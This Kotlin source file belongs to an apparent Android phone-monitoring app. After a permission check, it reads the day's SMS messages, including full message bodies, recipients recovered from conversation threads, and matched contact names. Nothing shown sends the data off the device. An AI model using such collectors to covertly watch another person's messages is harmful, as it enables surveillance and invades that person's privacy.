package com.spapp.monitoring.collectors

import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.BaseColumns
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.SmsLogEntry
import java.util.Calendar

/**
 * Reads SMS logs (number, timestamp, body, direction) via the SMS content provider.
 * Supports incoming, outgoing (sent/queued/outbox), and handles recipient resolution
 * via thread_id when the address field is omitted by the carrier or OEM messaging app.
 */
class SmsLogCollector(private val context: Context) {

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) ==
            PackageManager.PERMISSION_GRANTED

    /**
     * Collects SMS logs strictly for the present date (00:00:00 midnight to now).
     * [afterExternalId] == -1 means initial bootstrap for today: queries all SMS from today.
     * Once bootstrapped, queries incrementally for new SMS from today where _ID > afterExternalId.
     */
    fun collectSince(afterExternalId: Long, maxItems: Int = 1000): List<SmsLogEntry> {
        if (!hasPermission()) return emptyList()

        val startOfTodayMs = Calendar.getInstance().apply {
            set(Calendar.HOUR_OF_DAY, 0)
            set(Calendar.MINUTE, 0)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }.timeInMillis

        val entries = mutableListOf<SmsLogEntry>()
        val contactCache = mutableMapOf<String, String?>()
        val projection = arrayOf(
            BaseColumns._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE,
            Telephony.Sms.BODY,
            Telephony.Sms.THREAD_ID
        )

        val (selection, selectionArgs, sortOrder, cap) = if (afterExternalId < 0) {
            Quad(
                "${Telephony.Sms.DATE} >= ?",
                arrayOf(startOfTodayMs.toString()),
                "${Telephony.Sms.DATE} ASC",
                maxItems
            )
        } else {
            Quad(
                "${Telephony.Sms.DATE} >= ? AND ${BaseColumns._ID} > ?",
                arrayOf(startOfTodayMs.toString(), afterExternalId.toString()),
                "${BaseColumns._ID} ASC",
                maxItems
            )
        }

        context.contentResolver.query(Telephony.Sms.CONTENT_URI, projection, selection, selectionArgs, sortOrder)
            ?.use { cursor ->
                val idIdx = cursor.getColumnIndex(BaseColumns._ID)
                val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = cursor.getColumnIndex(Telephony.Sms.TYPE)
                val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
                val threadIdIdx = cursor.getColumnIndex(Telephony.Sms.THREAD_ID)

                while (cursor.moveToNext() && entries.size < cap) {
                    val type = cursor.getInt(typeIdx)
                    // Skip unsent drafts
                    if (type == Telephony.Sms.MESSAGE_TYPE_DRAFT) continue

                    val externalId = cursor.getLong(idIdx)
                    val rawAddress = if (addressIdx != -1) cursor.getString(addressIdx) else null
                    val threadId = if (threadIdIdx != -1) cursor.getLong(threadIdIdx) else -1L

                    val address = if (!rawAddress.isNullOrBlank()) {
                        rawAddress
                    } else if (threadId > 0) {
                        getAddressFromThread(threadId) ?: "Unknown"
                    } else {
                        "Unknown"
                    }

                    val date = cursor.getLong(dateIdx)
                    val body = if (bodyIdx != -1) cursor.getString(bodyIdx) else null
                    // Telephony.Sms.MESSAGE_TYPE_INBOX = 1 (incoming), all other active types (sent=2, outbox=4, queued=6) are outgoing
                    val direction = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "incoming" else "outgoing"

                    val contactName = contactCache.getOrPut(address) {
                        resolveContactName(address)
                    }

                    entries += SmsLogEntry(
                        direction = direction,
                        counterparty = address,
                        messageAtEpochMs = date,
                        body = body,
                        externalId = externalId,
                        contactName = contactName
                    )
                }
            }
        // Deduplicate in case provider query returned multi-part SMS or outbox/sent duplicates
        return entries.distinctBy { "${it.direction}_${it.counterparty}_${it.messageAtEpochMs}" }
    }

    private fun resolveContactName(number: String): String? {
        if (number.isBlank() || number == "Unknown" || number == "unknown" || number == "-1" || number == "-2") return null
        try {
            val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(number)
            )
            context.contentResolver.query(
                uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null,
                null,
                null
            )?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                    if (idx >= 0) {
                        val name = c.getString(idx)
                        if (!name.isNullOrBlank()) return name.trim()
                    }
                }
            }
        } catch (_: Exception) {
            // Contacts lookup fallback
        }
        return null
    }

    private fun getAddressFromThread(threadId: Long): String? {
        if (threadId <= 0) return null
        return try {
            val uri = Uri.parse("content://mms-sms/conversations?simple=true")
            context.contentResolver.query(
                uri,
                arrayOf(BaseColumns._ID, "recipient_ids"),
                "${BaseColumns._ID} = ?",
                arrayOf(threadId.toString()),
                null
            )?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndex("recipient_ids")
                    if (idx != -1) {
                        val recipientIds = c.getString(idx)
                        if (!recipientIds.isNullOrBlank()) {
                            resolveRecipientIds(recipientIds)
                        } else null
                    } else null
                } else null
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun resolveRecipientIds(recipientIds: String): String? {
        return try {
            val ids = recipientIds.split(" ").filter { it.isNotBlank() }
            val addresses = mutableListOf<String>()
            for (id in ids) {
                val uri = Uri.parse("content://mms-sms/canonical-address/$id")
                context.contentResolver.query(uri, arrayOf("address"), null, null, null)?.use { c ->
                    if (c.moveToFirst()) {
                        val addr = c.getString(0)
                        if (!addr.isNullOrBlank()) addresses += addr
                    }
                }
            }
            if (addresses.isNotEmpty()) addresses.joinToString(", ") else null
        } catch (_: Exception) {
            null
        }
    }

    private data class Quad(
        val selection: String?,
        val selectionArgs: Array<String>?,
        val sortOrder: String,
        val cap: Int
    )
}
